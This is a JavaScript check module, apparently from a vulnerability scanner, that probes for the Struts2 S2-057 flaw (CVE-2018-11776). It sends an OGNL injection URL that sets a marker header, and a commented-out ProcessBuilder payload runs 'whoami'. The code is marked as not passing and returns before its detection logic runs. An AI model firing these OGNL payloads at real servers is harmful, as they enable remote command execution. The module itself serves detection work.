
// 测试未通过
module.exports={
	tags:"web,struts2,057",
	"ID":"020102",
	des:"CVE-2018-11776,struts2 057漏洞检测",
	VulApps:["https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-057",
		"http://oe58q5lw3.bkt.clouddn.com/s/struts2/struts2/s2-057.war"],
	urls:["https://github.com/jas502n/St2-057/blob/master/README.md"],
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = _t.self,szUrl = url.replace(/\/[^\/\.]*?\.(jsp|do).*/gmi,'/'),
		    pld = 
			""
			/*
			+ "(#cmds={\"/bin/bash\",\"/c\", \"whoami\"})"
			+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
			+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
			+ ".(#ss=@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))"
			//+ ".(#ss=@org.apache.commons.io.IOUtils@toString(new java.io.InputStreamReader(#process.getInputStream(),'utf-8')))"
			+ ".(#ss.toString())"
			//////////*/
			 + "(#response=@org.apache.struts2.ServletActionContext@getResponse())"
			 + ".(#response.addHeader(\"struts2\",\"_struts2_\"))"
			 //+ ".('ok'.toString())"
			
		    	;
		
		    	// encodeURIComponent
		szUrl += ("${(" + encodeURIComponent(pld) +")}")+"/actionChain1.action";
		console.log(szUrl);
		
		_s.request(_s.fnOptHeader({method: 'GET',uri: szUrl
		    ,headers:
		    {
		    	"User-Agent": _s.g_szUa
		    }})
		  ,function (error, response, body)
		  {
		  console.log(response.headers);
		  // console.log(response);
		  console.log(response.headers["location"]);
		  if(1)return;
		    console.log(error||body);
		  	_s.error(error);
		  	body = String(body);
		  	// console.log()
		  	_s.fnShowBody(body);
	  		if(body)
	  		{
	  			body = _s.fnCheckVul1(String(body));

	  			// body = String(body).replace(/cmdend.*?$/gmi, "cmdend\n");
	  			// console.log(url + "\n"+body);
	  			_s.fnDoBody(body,"s2-045",url,null,function(o)
	  			{
	  				var r = {"url":url,"send":_s.g_postData};
	  				fnCbk(_s.copyO2O(r,o),_t);
	  			});
	  		}
		  }
		  
		);
	}
};